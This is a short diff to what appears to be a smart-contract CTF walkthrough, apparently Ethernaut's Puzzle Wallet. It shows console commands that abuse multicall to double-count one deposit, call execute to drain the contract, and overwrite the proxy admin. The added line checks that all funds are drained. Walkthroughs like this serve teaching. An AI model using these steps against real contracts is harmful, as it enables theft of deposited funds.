@@ -20,5 +20,6 @@
 - `multicallDepositData = await contract.methods["multicall(bytes[])"].request([depositData]).then(value => value.data)`
 - `await contract.multicall([multicallDepositData, multicallDepositData], {value: 0.001 * 10**18})`
 - `await contract.execute(player, await contract.balances(player).then(n=>n.toNumber()), 0)`
+- confirm with `await getBalance(contract.address)`; should be 0 as all funds drained
 
 4. Use `setMaxBalance` to set value of `admin` in proxy to attacker
